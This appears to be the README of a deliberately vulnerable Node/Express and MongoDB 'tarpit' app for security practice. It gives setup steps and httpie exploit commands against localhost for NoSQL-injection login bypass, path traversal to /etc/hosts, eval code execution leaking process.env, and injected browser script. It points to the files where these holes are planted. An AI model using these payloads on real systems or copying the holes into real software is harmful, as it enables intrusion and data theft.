# NodeJS Tarpit

An ExpressJS (tarpit) application using mongoDB.

I am using [httpie](https://httpie.org), an alternative to curl to trigger exploits.

## Getting started

:crossed_fingers::crossed_fingers::crossed_fingers: I hope all goes as smooth as possible

### Pre-requisites

- [NodeJS](https://nodejs.org/en/) Get the latest version
- [MongoDB Community Edition](https://docs.mongodb.com/manual/administration/install-community/) Install Mongodb Community Edition and run setup provided in documentation

### Setup

start mongoDB server (`sudo mongod`)
start mongoDB client (`mongo`)
Insert user rows using the query

```
use tarpit
```

```
db.tarpit.insertOne({ fname: 'f', lname: 'l', passportnum: 'aa', address1: 'a1', address2: 'a2', zipCode: 1234, userCreditCardInfo: 'a8723jjas9892892', password: 'p', username: 'u'})
```

### Installation

Run `npm install` to install all dependencies for the project to run

### Run Application

Run `npm start` to start the application and you will provided a local address to open in browser

## Exploits

### No SQL Injection

Login can be exploited with the following query as the username and password are not validated

```bash
http  --print=HB POST http://localhost:8089/api/v1/login username:='{"$gt": ""}' password:='{"$gt": ""}'
```

### Directory Traversal Vulnerability

Can get access to any file on the server using the command

```bash
http GET http://localhost:8089/api/v1/image-lookup image=="/etc/hosts"
```

### Remote Code Execution

RCE exploting `eval` on server

```bash
http GET http://localhost:8089/user-input userInput=="console.log(process.env)"
```

Injecting script onto user browser

```bash
http GET http://localhost:8089/user-input userInput=="alert('You system is under our control now.')"
```

## Vulnerabilities

- [x] [directory traversal](src/Controllers/ImageLookup.js)
- [x] [nosql injection](src/Controllers/Login.js)
- [x] [remote code execution](src/views.js): [UserInput](src/Views/UserInput.pug)
- [x] [data leak](src/Controllers/Login.js)
